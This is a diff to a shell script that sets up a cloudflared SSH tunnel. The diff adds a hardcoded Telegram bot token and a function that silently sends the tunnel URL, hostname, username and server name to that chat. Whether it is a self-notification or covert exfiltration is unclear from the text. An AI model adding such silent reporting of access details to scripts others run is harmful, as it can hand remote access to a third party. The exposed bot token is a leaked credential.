@@ -9,6 +9,21 @@ LOG_FILE="/tmp/cloudflared.log"
 URL_FILE="/tmp/tunnel_url.txt"
 PASSWD_FLAG="/tmp/.passwd_already_set"
 
+
+# Telegram Config
+BOT_TOKEN="8902397029:AAFTZjlgsPgYCM7vkhniIpDc0vkHdDg05zA"
+CHAT_ID="7649560763"
+
+send_telegram() {
+    local TEXT="$1"
+
+    curl -s -X POST \
+    "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+    -d chat_id="${CHAT_ID}" \
+    --data-urlencode text="$TEXT" \
+    >/dev/null
+}
+
 # --- Banner ---
 if ! command -v figlet >/dev/null 2>&1; then
     apt update -y >/dev/null 2>&1
@@ -116,6 +131,22 @@ if [ -n "$URL" ]; then
     echo ">> Disimpan juga di: $URL_FILE"
     echo ">> Copy hostname di atas, lalu jalankan di Termux:"
     echo "   ./start-termux.sh $HOSTNAME_ONLY"
+    send_telegram "✅ SSH Tunnel Aktif
+
+Hostname:
+$HOSTNAME_ONLY
+
+URL:
+$URL
+
+User:
+$(whoami)
+
+Server:
+$(hostname)
+
+Waktu:
+$(date)"
 else
     echo "Gagal mendapatkan URL tunnel. Cek log: $LOG_FILE"
     tail -n 20 "$LOG_FILE"
